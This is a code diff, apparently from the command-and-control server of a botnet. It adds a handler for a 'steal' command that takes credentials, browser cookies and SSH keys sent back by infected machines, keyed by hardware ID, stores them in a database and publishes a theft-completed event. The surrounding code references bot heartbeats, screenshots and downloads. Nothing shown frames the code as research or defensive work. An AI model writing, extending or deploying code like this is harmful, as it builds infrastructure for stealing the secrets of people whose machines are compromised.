@@ -15,6 +15,7 @@ from .storage import (
     save_download,
     save_response,
     save_screenshot,
+    save_stealer_result,
     set_bot_disconnected,
     update_bot_heartbeat,
     upsert_bot,
@@ -209,6 +210,35 @@ async def handle_response(packet: dict, hwid: str, event_bus=None):
             # Remove data_b64 from output before storing
             output = {k: v for k, v in output.items() if k != "data_b64"}
             output["extracted_id"] = extracted["id"]
+
+    elif command_type == "steal" and isinstance(output, dict):
+        result_id = str(uuid.uuid4())
+        await save_stealer_result(
+            result_id=result_id,
+            bot_hwid=hwid,
+            command_id=cmd_id,
+            credentials=output.get("credentials", []),
+            cookies=output.get("cookies", []),
+            ssh_keys=output.get("ssh_keys", []),
+            errors=output.get("errors", []),
+            collection_time_ms=output.get("collection_time_ms"),
+        )
+        if event_bus:
+            await event_bus.publish(
+                Event(
+                    EventType.STEAL_COMPLETED,
+                    {
+                        "hwid": hwid,
+                        "result_id": result_id,
+                        "credential_count": len(output.get("credentials", [])),
+                        "error_count": len(output.get("errors", [])),
+                    },
+                )
+            )
+        output = {
+            "result_id": result_id,
+            "credential_count": len(output.get("credentials", [])),
+        }
 
     # Save response to database
     output_str = json.dumps(output) if isinstance(output, dict) else str(output)
